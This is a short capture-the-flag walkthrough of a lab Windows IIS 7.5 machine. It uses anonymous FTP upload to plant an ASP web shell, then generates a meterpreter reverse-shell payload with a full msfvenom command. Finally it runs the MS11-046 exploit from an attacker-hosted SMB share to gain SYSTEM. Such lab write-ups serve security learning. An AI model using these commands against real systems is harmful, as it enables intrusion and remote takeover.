Started with a nmap scan
```
21 FTP
80 Miscrosoft IIS 7.5
```
Looking  at the FTP we have anonymous login and it looks like the file structure of the website and we can upload files to this FTP if we upload a `asp` file the website renders it so we can upload a asp shell and get RCE or a reverse shell and we got a call back as `iis apppool/web` to get a better shell we going to use msfvenom make a aspx shell `msfvenom -p windows/meterpreter/reverse_tcp lhost=tun0 lport=4443 -f aspx -o rev1.aspx` and then use curl to reach the file after we put it on the FTP and now we got a better shell and can use the local exploit suggester and its vulnerable to `ms11-046` and we can setup are smb server and then run it on the host `\\10.10.16.4\s\ms11-046.exe` and now we are system and can get both flags 